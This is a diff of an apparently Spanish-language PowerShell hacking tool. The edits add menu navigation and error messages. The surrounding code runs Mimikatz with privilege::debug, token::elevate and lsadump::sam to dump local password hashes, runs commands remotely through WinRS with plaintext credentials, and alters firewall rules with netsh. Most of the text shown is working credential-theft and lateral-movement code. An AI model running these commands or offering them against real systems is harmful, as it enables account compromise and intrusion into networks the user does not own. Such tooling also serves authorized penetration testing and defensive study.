@@ -149,7 +149,7 @@ $Ps4="netsh advfirewall firewall set rule group='Instrumental de Administración
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Ps4" }
 	
         'M' { 
-        Clear-Host; Show-Banner ; Write-Host "[1] - Mimikatz" ; Write-Host "[2] - Consola semi-interactiva" ; Write-Host ""
+        Clear-Host; Show-Banner ; Write-Host "[1] - Mimikatz" ; Write-Host "[2] - Consola semi-interactiva" ; Write-Host "[M] - Volver al menú principal" ; Write-Host ""
         $module = Read-Host -Prompt 'Elige el módulo que quieres cargar' ; Write-Host ""
         if($module -like '1') { Clear-Host; Show-Banner ; Write-Host "[1] - Recuperar hashes locales" ; Write-Host ""
         $mimikatz = Read-Host -Prompt 'Elige el módulo que quieres cargar' ; Write-Host ""
@@ -161,9 +161,10 @@ $Ps4="netsh advfirewall firewall set rule group='Instrumental de Administración
 	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
 	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
         powershell $mimipath\mimikatz.exe privilege::debug token::elevate lsadump::sam exit 
-        Write-Host "" ; pause ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }}
+        Write-Host "" ; pause ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
+        else { Write-Host "Opción incorrecta, vuelve a intentarlo de nuevo" -ForegroundColor Magenta }}
         if($module -like '2') { $console ="true" ; Write-Host "Módulo cargado con éxito!" -ForegroundColor Green }
-        if($module -in '1','2') { $null }
+        if($module -in '1','2','m') { $null }
         else { Write-Host "Opción incorrecta, vuelve a intentarlo de nuevo" -ForegroundColor Magenta }
         sleep -milliseconds 2000 ; Clear-Host }
 	
